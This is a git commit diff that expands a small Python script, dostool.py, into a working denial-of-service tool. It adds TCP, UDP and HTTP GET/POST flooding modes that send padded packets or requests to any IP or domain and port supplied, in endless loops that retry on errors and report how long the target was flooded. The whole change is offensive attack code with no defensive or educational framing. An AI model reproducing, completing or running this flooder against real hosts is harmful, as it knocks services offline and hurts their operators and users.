7ad428ebdbbe427acd7aaa16f2c6ddddd1667468
i4ego <me@i4ego.ru>
2026-04-22 21:06:31 +0500

    load v0.1

--- dostool.py
+++ dostool.py
@@ -1,12 +1,22 @@
 import sys
 import re
+import getpass
+import time
+import socket, requests
 
-SUPPORTED_ACTIONS = ("tcp", "udp", "http")
+SUPPORTED_ACTIONS = ("tcp", "s-tcp", "l-tcp", "udp", "s-udp", "l-udp", "http-get", "http-post")
 IP_PATTERN = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):([1-9]\d*|0)$'
 DOMAIN_PATTERN = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}:([1-9]\d*|0)$'
 
 def help(msg: str = ""):
-    print(msg)
+    print(f"""\
+Usage: {sys.argv[0]} [{", ".join(SUPPORTED_ACTIONS)}] <ip/domain>:<port>
+
+Examples:
+\t{sys.argv[0]} tcp example.com:8443
+\t{sys.argv[0]} udp-s 1.1.1.1:53
+""")
+    exit(0)
 
 def parse_argv(argv: list) -> tuple[str, list[tuple[str, int]]]:
     if len(argv) <3:
@@ -35,5 +45,84 @@ def parse_argv(argv: list) -> tuple[str, list[tuple[str, int]]]:
         targets.append((target.split(":")[0], int(target.split(":")[1])))
     return action, targets
 
+def cycle(func, counter: int, startfrom = 0, iserr=False):
+    try:
+        sent = startfrom
+        while 1:
+            func()
+            sent += 1
+
+            if sent % counter == 0:
+                print(f"{"  " if not iserr else ""}Sent {sent} packets")
+                iserr = False
+    except KeyboardInterrupt:
+        print(f"\nStopping... ({target[0]})")
+        return
+    except OSError as e:
+        if e.errno == 55:
+            try:
+                print("O ", end="")
+                time.sleep(0.5)
+            except KeyboardInterrupt:
+                print(f"\nStopping... ({target[0]})")
+                return
+            cycle(func, counter, sent, True)
+        else:
+            print(f"Got an error: {e}. Continue?")
+            try:
+                getpass.getpass("Enter to continue, Ctrl+C to stop: ")
+                print("O ", end="")
+                cycle(func, counter, sent, True)
+            except KeyboardInterrupt:
+                print(f"\nStopping... ({target[0]})")
+                return
+
+def dos(target: tuple[str, int], method: str):
+    ip = target[0]
+    if re.match(DOMAIN_PATTERN, f"{target[0]}:{target[1]}"):
+        try: ip = socket.gethostbyname(target[0])
+        except Exception as e: raise NameError(f"Couldn't find server: {target[0]} ({e})")
+    print(f"\nStarting... ({target[0]})")
+    match method:
+        case "tcp" | "s-tcp" | "l-tcp":
+            packet = ("A"*1024*24).encode("ascii") if method == "tcp" else ("A" * 2048).encode("ascii")
+            packet = ("A"*1024*48).encode("ascii") if method == "l-tcp" else packet
+            print(f"Sending TCP Packets. Mode: {"Large" if method=="l-tcp" else ("Normal" if method=="tcp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
+            def tcp():
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip, target[1]))
+                s.sendall(packet)
+                s.close()
+            cycle(tcp, 1 if method=="l-tcp" else (5 if method=="tcp" else 10))
+        case "udp" | "s-udp" | "l-udp":
+            packet = ("A"*1024*24).encode("ascii") if method == "udp" else ("A" * 2048).encode("ascii")
+            packet = ("A"*1024*6).encode("ascii") if method == "l-udp" else packet
+            print(f"Sending TCP Packets. Mode: {"Large" if method=="l-udp" else ("Normal" if method=="udp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
+            def udp():
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.sendto(packet, (ip, target[1]))
+                s.close()
+            cycle(udp, 500 if method=="l-udp" else (750 if method=="udp" else 1250))
+        case "http-get":
+            print(f"Sending HTTP Requests. Mode: GET")
+            def get():
+                requests.get(f"http://{ip}:{target[1]}", data={"A"*128 : "A"*256})
+            cycle(get, 10)
+        case "http-post":
+            print(f"Sending HTTP Requests. Mode: GET")
+            def post():
+                requests.post(f"http://{ip}:{target[1]}", data={"A"*1024 : "A"*1024})
+            cycle(post, 10)
+
+
 if __name__ == "__main__":
-    print(parse_argv(sys.argv))
+    args = parse_argv(sys.argv)
+    for target in args[1]:
+        try:
+            start_time = time.time()
+            dos(target, args[0])
+            print(f"Being flooded by {time.time()-start_time:.2f} sec")
+        except NameError as e:
+            print(e)
+        except RecursionError:
+            print("Attack ended")
